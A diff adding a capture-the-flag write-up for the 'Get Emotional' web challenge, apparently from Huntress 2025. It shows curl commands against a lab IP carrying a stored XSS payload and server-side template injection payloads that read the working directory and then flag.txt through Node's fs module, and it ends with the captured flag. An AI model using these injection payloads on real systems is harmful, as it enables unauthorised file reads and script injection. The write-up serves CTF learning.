@@ -1,0 +1,42 @@
+Challenge: Get Emotional
+Category: Web
+Author: John Hammond
+
+Description:
+
+Don't be shy, show your emotions! Get emotional if you have to! Uncover the flag.
+
+[Challenge Update]: You can download the source code of this application below.
+
+1. Launch the challenge URL: http://10.1.133.55/
+2. Selecting an emoji results in the following [get-emotional-select-1.png]
+3. I ran all the emoji's through thinking one would return a flag, I also found you could URL encode and submit emoji's not part of challenge and they would render. [get-emotional-false-flag.png]
+	3a. https://gchq.github.io/CyberChef/#recipe=URL_Encode(false)&input=8J%2BPgQ&oenc=65001
+4. Trying some basic XSS yielded positive results [get-emotional-xss.png]
+	4a. This remained on page refresh as well
+
+┌──(ctf㉿kali)-[~/CTF/huntress2025/web/get_emotional]
+└─$ curl -s -X POST http://10.1.133.55/setEmoji \
+  --data-urlencode 'emoji=<svg/onload=alert("xss")>'
+{"profileEmoji":"<svg/onload=alert(\"xss\")>"} 
+
+5. I tried experiementing with returning "flag.txt" and after many failed attempts and crashing the challenge I was able to leverage AI to generate the following payload
+	5a. Get CWD with the following payload [get-emotional-cwd.png]
+
+	┌──(ctf㉿kali)-[~/CTF/huntress2025/web/get_emotional]
+	└─$ curl -s -X POST http://10.1.133.55/setEmoji \
+	  --data-urlencode 'emoji=<%= process.cwd() %>'
+	{"profileEmoji":"<%= process.cwd() %>"}
+
+	5b. With the CWD in hand, I tried to read flag.txt from /emoji_profile/flag.txt with the following AI generated payload [get-emotional-flag.png]
+
+	┌──(ctf㉿kali)-[~/CTF/huntress2025/web/get_emotional]
+	└─$ curl -s -X POST http://10.1.133.55/setEmoji \
+	  --data-urlencode 'emoji=<%= global.process.mainModule.constructor._load("fs").readFileSync("/emoji_profile/flag.txt","utf8") %>'
+	{"profileEmoji":"<%= global.process.mainModule.constructor._load(\"fs\").readFileSync(\"/emoji_profile/flag.txt\",\"utf8\") %>"}
+
+	┌──(ctf㉿kali)-[~/CTF/huntress2025/web/get_emotional]
+	└─$ curl -s http://10.1.133.55/ | grep -oE "flag{.*?}" --color=none
+	flag{8c8e0e59d1292298b64c625b401e8cfa}
+
+Flag: flag{8c8e0e59d1292298b64c625b401e8cfa}
